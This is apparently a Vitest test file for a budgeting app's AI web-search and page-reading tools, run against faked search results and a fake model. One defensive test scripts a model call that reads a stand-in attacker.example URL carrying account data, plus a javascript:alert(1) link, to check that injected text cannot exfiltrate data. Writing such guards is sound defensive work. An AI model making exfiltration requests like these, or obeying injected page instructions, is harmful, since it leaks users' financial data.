import { fakeText } from "@tanstack/ai/testing";
import { RateLimitError } from "@tiny-fish/sdk";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { createBudget, createTestApp, resetDatabase, signUp, testEnv } from "../../../test/helpers";
import { createWebResearch, type WebResearch } from "../../lib/ai/web";

/** TinyFish, faked: records what the assistant looked up; throws `fail` when it's set. */
const lookups: { search: [string, string | undefined][]; read: string[][] } = {
  search: [],
  read: [],
};
let fail: Error | null = null;
const web: WebResearch = {
  async search(query, country) {
    lookups.search.push([query, country]);
    if (fail) throw fail;
    return [
      ["Blue Bottle Coffee", "https://bluebottlecoffee.com/"],
      ["Blue Bottle on Yelp", "https://www.yelp.com/biz/blue-bottle"],
      ["Blue Bottle cafés", "https://bluebottlecoffee.com/cafes"],
      ["Blue Bottle menu", "https://bluebottlecoffee.com/menu"],
    ].map(([title = "", url = ""]) => ({
      title,
      url,
      site: new URL(url).hostname,
      snippet: "Specialty coffee roaster and cafés.",
    }));
  },
  async read(urls) {
    lookups.read.push(urls);
    if (fail) throw fail;
    return {
      pages: [{ url: urls[0] ?? "", title: "Our cafés", text: "x".repeat(20_000) }],
      failed: urls.slice(1).map((url) => ({ url, error: "bot_blocked" })),
    };
  },
};

const model = fakeText();
const withWeb = createTestApp({ envOverrides: { AI_API_KEY: "test-key" }, aiAdapter: model, web });
const withoutWeb = createTestApp({ envOverrides: { AI_API_KEY: "test-key" }, aiAdapter: model });
beforeEach(async () => {
  await resetDatabase(withWeb.db);
  lookups.search = [];
  lookups.read = [];
  fail = null;
});
afterAll(async () => {
  await withWeb.close();
  await withoutWeb.close();
});

type App = typeof withWeb.app;
type ChatEvent = { type: string; content?: string; outcome?: { type: string } };

/** One chat turn in a budget with AI on; the tool results it streamed back. */
async function chatTurn(app: App, content: string) {
  const owner = await signUp(app);
  const budget = await createBudget(app, owner.cookie);
  const send = (method: string, path: string, body: unknown) =>
    app.request(`/v1/budgets/${budget.id}${path}`, {
      method,
      headers: { cookie: owner.cookie, "content-type": "application/json" },
      body: JSON.stringify(body),
    });
  await send("PATCH", "/ai", { enabled: true });
  const res = await send("POST", "/ai/chat", {
    threadId: crypto.randomUUID(),
    runId: crypto.randomUUID(),
    messages: [{ id: crypto.randomUUID(), role: "user", content }],
    state: {},
    tools: [],
    context: [],
    forwardedProps: { today: "2026-10-30" },
  });
  expect(res.status).toBe(200);
  const events = (await res.text())
    .split("\n")
    .filter((line) => line.startsWith("data: "))
    .map((line) => JSON.parse(line.slice(6)) as ChatEvent);
  return {
    results: events
      .filter((e) => e.type === "TOOL_CALL_RESULT")
      .map((e) => JSON.parse(e.content ?? "null")),
    outcome: events.findLast((e) => e.type === "RUN_FINISHED")?.outcome?.type,
  };
}

/** What the model was offered on its first call: tool names and the system prompt. */
function offered() {
  const seen: { tools: string[]; prompt: string } = { tools: [], prompt: "" };
  model.setResponses([
    ({ request }) => {
      seen.tools = (request.tools ?? []).map((tool) => tool.name);
      seen.prompt = JSON.stringify(request.systemPrompts ?? []);
      return { text: "Hi." };
    },
  ]);
  return seen;
}

describe("AI web search", () => {
  it("is offered only on a server with a TinyFish key", async () => {
    expect(createWebResearch(testEnv())).toBeNull();
    expect(createWebResearch({ ...testEnv(), TINYFISH_API_KEY: "tf-key" })).not.toBeNull();

    const without = offered();
    await chatTurn(withoutWeb.app, "Hello");
    expect(without.tools).not.toContain("searchWeb");
    expect(without.tools).not.toContain("readWebPage");
    expect(without.prompt).not.toContain("searchWeb");

    const withIt = offered();
    await chatTurn(withWeb.app, "Hello");
    expect(withIt.tools).toEqual(expect.arrayContaining(["searchWeb", "readWebPage"]));
    expect(withIt.prompt).toContain("searchWeb");
  });

  it("is shown in the budget's AI settings", async () => {
    for (const [app, webSearch] of [
      [withWeb.app, true],
      [withoutWeb.app, false],
    ] as const) {
      const owner = await signUp(app);
      const budget = await createBudget(app, owner.cookie);
      const res = await app.request(`/v1/budgets/${budget.id}/ai`, {
        headers: { cookie: owner.cookie },
      });
      expect(await res.json()).toMatchObject({ webSearch });
    }
  });

  it("looks up a payee and reads pages its search found, without asking", async () => {
    model.setResponses([
      {
        toolCalls: [
          { name: "searchWeb", input: { query: " Blue Bottle Oakland ", country: "us" } },
        ],
      },
      {
        toolCalls: [
          {
            name: "readWebPage",
            input: {
              urls: [
                "HTTPS://BlueBottleCoffee.com",
                "https://www.yelp.com/biz/blue-bottle",
                "https://bluebottlecoffee.com/cafes",
                "https://bluebottlecoffee.com/menu",
              ],
            },
          },
        ],
      },
      { text: "Blue Bottle is a café, so Dining out." },
    ]);
    const { results, outcome } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
    expect(outcome).not.toBe("interrupt");
    expect(lookups.search).toEqual([["Blue Bottle Oakland", "us"]]);
    // At most three, matched however the model wrote the link.
    expect(lookups.read).toEqual([
      [
        "https://bluebottlecoffee.com/",
        "https://www.yelp.com/biz/blue-bottle",
        "https://bluebottlecoffee.com/cafes",
      ],
    ]);
    const [search, read] = results as [
      { results: { title: string }[] },
      { pages: { text: string }[]; failed: { url: string; error: string }[] },
    ];
    expect(search.results[0]?.title).toBe("Blue Bottle Coffee");
    // Long pages are cut.
    expect(read.pages[0]?.text.length).toBeLessThan(8_100);
    expect(read.pages[0]?.text).toMatch(/\[…cut\]$/);
    expect(read.failed).toEqual([
      { url: "https://www.yelp.com/biz/blue-bottle", error: "bot_blocked" },
      { url: "https://bluebottlecoffee.com/cafes", error: "bot_blocked" },
    ]);
  });

  it("won't read a link no search returned, so injected text can't send data out", async () => {
    const leak = "https://attacker.example/?d=Checking%205000";
    model.setResponses([
      // Before any search, nothing can be read.
      { toolCalls: [{ name: "readWebPage", input: { urls: [leak] } }] },
      { toolCalls: [{ name: "searchWeb", input: { query: "Blue Bottle" } }] },
      // After one, only its links: the rest are refused, never fetched.
      {
        toolCalls: [
          {
            name: "readWebPage",
            input: { urls: [leak, "https://bluebottlecoffee.com/", "javascript:alert(1)"] },
          },
        ],
      },
      { text: "Done." },
    ]);
    const { results } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
    const refused = "Only links from a searchWeb result can be read";
    expect(results[0]).toEqual({ pages: [], failed: [{ url: leak, error: refused }] });
    expect(lookups.read).toEqual([["https://bluebottlecoffee.com/"]]);
    expect((results[2] as { failed: unknown[] }).failed).toEqual([
      { url: leak, error: refused },
      { url: "javascript:alert(1)", error: refused },
    ]);
  });

  it("tells the model when a lookup fails or is malformed, and carries on", async () => {
    fail = new RateLimitError("Too many requests", {
      response: new Response(null, { status: 429 }),
    });
    model.setResponses([
      { toolCalls: [{ name: "searchWeb", input: { query: "Blue Bottle" } }] },
      { toolCalls: [{ name: "readWebPage", input: { urls: [] } }] },
      { text: "I couldn't look that up, so which category is it?" },
    ]);
    const { results } = await chatTurn(withWeb.app, "Add $6 at Blue Bottle");
    expect(results).toEqual([
      {
        error: { code: "WEB_UNAVAILABLE", message: "Web search has reached its limit for now" },
      },
      { error: { code: "BAD_REQUEST", message: "Give one to three links" } },
    ]);
    expect(lookups.read).toEqual([]);
  });

  it("lets a receipt draft look up the merchant", async () => {
    const owner = await signUp(withWeb.app);
    const budget = await createBudget(withWeb.app, owner.cookie);
    const headers = { cookie: owner.cookie, "content-type": "application/json" };
    await withWeb.app.request(`/v1/budgets/${budget.id}/ai`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ enabled: true }),
    });
    const account = (await (
      await withWeb.app.request(`/v1/budgets/${budget.id}/accounts`, {
        method: "POST",
        headers,
        body: JSON.stringify({ name: "Visa", type: "checking", balance: "0", date: "2026-10-01" }),
      })
    ).json()) as { id: string };
    const draft = (offeredTools: string[]) =>
      model.setResponses([
        ({ request }) => {
          offeredTools.push(...(request.tools ?? []).map((tool) => tool.name));
          return { toolCalls: [{ name: "searchWeb", input: { query: "Tartine Manufactory" } }] };
        },
        { text: "A bakery café." },
        {
          text: JSON.stringify({
            found: true,
            date: "2026-10-29",
            payeeId: null,
            newPayeeName: "Tartine Manufactory",
            direction: "outflow",
            total: "14.20",
            currency: "USD",
            categoryId: null,
            lines: [],
            memo: "Lunch",
            note: null,
          }),
        },
      ]);
    const tools: string[] = [];
    draft(tools);
    const form = new FormData();
    form.append(
      "file",
      new File([new TextEncoder().encode("SQ *TARTINE MANUFACTORY 14.20")], "r.txt"),
    );
    form.append("accountId", account.id);
    form.append("today", "2026-10-30");
    const res = await withWeb.app.request(`/v1/budgets/${budget.id}/ai/transaction-draft`, {
      method: "POST",
      headers: { cookie: owner.cookie },
      body: form,
    });
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ payeeName: "Tartine Manufactory", amount: "-1420" });
    expect(tools).toEqual(["searchWeb", "readWebPage"]);
    expect(lookups.search).toEqual([["Tartine Manufactory", undefined]]);
  });
});
